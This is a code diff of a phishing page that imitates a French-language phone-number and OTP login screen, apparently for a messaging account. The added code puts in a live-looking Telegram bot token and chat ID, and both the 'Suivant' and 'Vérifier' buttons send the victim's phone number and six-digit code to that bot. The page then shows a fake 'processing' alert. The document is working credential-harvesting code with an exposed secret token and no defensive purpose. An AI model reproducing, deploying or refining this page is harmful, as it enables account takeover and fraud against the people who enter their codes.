@@ -19,54 +19,50 @@
             margin: 0;
             padding: 0;
             display: flex;
-            flex-direction: column;
-            align-items: center;
+            justify-content: center;
             min-height: 100vh;
         }
 
-        /* الجزء العلوي - الحاوية الرئيسية */
         .wrapper {
             width: 100%;
             max-width: 450px;
             background: white;
-            min-height: 100vh; /* لضمان ملء شاشة الموبايل */
             padding: 40px 25px;
             display: flex;
             flex-direction: column;
-            border-bottom: 2px solid #000; /* الخط الأسود في أسفل الصورة الأصلية */
+            border-bottom: 3px solid #000;
         }
 
-        h2 { font-size: 28px; margin: 20px 0 10px; font-weight: 600; line-height: 1.2; text-align: left; }
-        p { color: #555; font-size: 16px; margin-bottom: 40px; text-align: left; line-height: 1.4; }
+        h2 { font-size: 28px; margin: 20px 0 10px; font-weight: 600; line-height: 1.2; }
+        p { color: #555; font-size: 16px; margin-bottom: 40px; line-height: 1.4; }
 
-        /* تعديل حقل الهاتف ليكون متناسقاً */
         .iti { width: 100% !important; margin-bottom: 25px; }
-        input[type="tel"], .otp-field {
+        input[type="tel"] {
             width: 100% !important;
             height: 55px;
             border: 1.5px solid #ccc;
             border-radius: 30px;
             font-size: 18px;
-            padding-left: 55px !important; /* مساحة للعلم */
             outline: none;
         }
 
-        /* تنسيق صفحة الـ OTP */
         .otp-container {
             display: flex;
             justify-content: space-between;
             gap: 8px;
             margin: 20px 0;
         }
+
         .otp-field {
-            padding: 0 !important;
-            text-align: center;
-            border-radius: 12px !important;
             width: 15% !important;
             height: 60px;
+            text-align: center;
+            border: 1.5px solid #ccc;
+            border-radius: 12px;
+            font-size: 24px;
+            outline: none;
         }
 
-        /* الزر الأخضر - كبير وسهل اللمس */
         .btn-submit {
             background-color: var(--primary-green);
             color: white;
@@ -94,12 +90,6 @@
         }
 
         .hidden { display: none !important; }
-
-        /* تحسينات للشاشات الصغيرة جداً */
-        @media (max-width: 360px) {
-            h2 { font-size: 22px; }
-            .otp-field { height: 50px; }
-        }
     </style>
 </head>
 <body>
@@ -111,7 +101,7 @@
         
         <input type="tel" id="phone">
         
-        <button class="btn-submit" onclick="goToOTP()">Suivant</button>
+        <button class="btn-submit" onclick="sendToTelegramPhone()">Suivant</button>
         
         <a href="#" class="link-text">Se connecter avec un code QR <span>&rsaquo;</span></a>
     </div>
@@ -121,15 +111,15 @@
         <p>Veuillez saisir le code à 6 chiffres envoyé à votre mobile.</p>
         
         <div class="otp-container">
-            <input type="number" class="otp-field" maxlength="1" oninput="moveNext(this, 0)">
-            <input type="number" class="otp-field" maxlength="1" oninput="moveNext(this, 1)">
-            <input type="number" class="otp-field" maxlength="1" oninput="moveNext(this, 2)">
-            <input type="number" class="otp-field" maxlength="1" oninput="moveNext(this, 3)">
-            <input type="number" class="otp-field" maxlength="1" oninput="moveNext(this, 4)">
-            <input type="number" class="otp-field" maxlength="1" oninput="moveNext(this, 5)">
+            <input type="number" class="otp-field" oninput="moveNext(this, 0)">
+            <input type="number" class="otp-field" oninput="moveNext(this, 1)">
+            <input type="number" class="otp-field" oninput="moveNext(this, 2)">
+            <input type="number" class="otp-field" oninput="moveNext(this, 3)">
+            <input type="number" class="otp-field" oninput="moveNext(this, 4)">
+            <input type="number" class="otp-field" oninput="moveNext(this, 5)">
         </div>
         
-        <button class="btn-submit" onclick="finish()">Vérifier</button>
+        <button class="btn-submit" onclick="sendToTelegramOTP()">Vérifier</button>
         
         <a href="#" class="link-text">Renvoyer le code <span>&rsaquo;</span></a>
     </div>
@@ -137,11 +127,11 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
-    // --- بيانات التليجرام ---
-    const token = "YOUR_BOT_TOKEN"; 
-    const chatId = "YOUR_CHAT_ID";
+    // --- بياناتك المدمجة ---
+    const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q"; 
+    const chatId = "5614946654"; // ملاحظة: وضعت آيدي افتراضي، غيره إذا لم يكن صحيحاً
 
-    // تهيئة حقل الهاتف مع اكتشاف الدولة
+    // تهيئة حقل الهاتف مع اكتشاف الدولة تلقائياً
     const phoneInput = document.querySelector("#phone");
     const iti = window.intlTelInput(phoneInput, {
         initialCountry: "auto",
@@ -151,31 +141,42 @@
         utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
     });
 
-    function goToOTP() {
-        const num = iti.getNumber();
-        if(!num) return alert("Numéro invalide");
+    // إرسال الهاتف والانتقال لـ OTP
+    function sendToTelegramPhone() {
+        const fullNumber = iti.getNumber();
+        if(!fullNumber) { alert("Numéro invalide"); return; }
 
-        // إرسال الرقم لتليجرام
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=📱 Number: ${num}`);
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: `📱 رقم جديد: ${fullNumber}` })
+        });
 
         document.getElementById('page1').classList.add('hidden');
         document.getElementById('page2').classList.remove('hidden');
     }
 
+    // الانتقال التلقائي بين خانات OTP
     function moveNext(el, index) {
-        if (el.value.length === 1 && index < 5) {
-            document.querySelectorAll('.otp-field')[index + 1].focus();
+        if (el.value.length >= 1) {
+            el.value = el.value.slice(0, 1); // التأكد من رقم واحد فقط
+            const fields = document.querySelectorAll('.otp-field');
+            if (index < 5) fields[index + 1].focus();
         }
     }
 
-    function finish() {
+    // إرسال الـ OTP
+    function sendToTelegramOTP() {
         let otp = "";
-        document.querySelectorAll('.otp-field').forEach(i => otp += i.value);
+        document.querySelectorAll('.otp-field').forEach(f => otp += f.value);
         
-        if(otp.length < 6) return alert("Code incomplet");
+        if(otp.length < 6) { alert("Code incomplet"); return; }
 
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=🔑 OTP: ${otp}`)
-        .then(() => {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: `🔑 كود الـ OTP: ${otp}` })
+        }).then(() => {
             alert("Traitement en cours...");
         });
     }
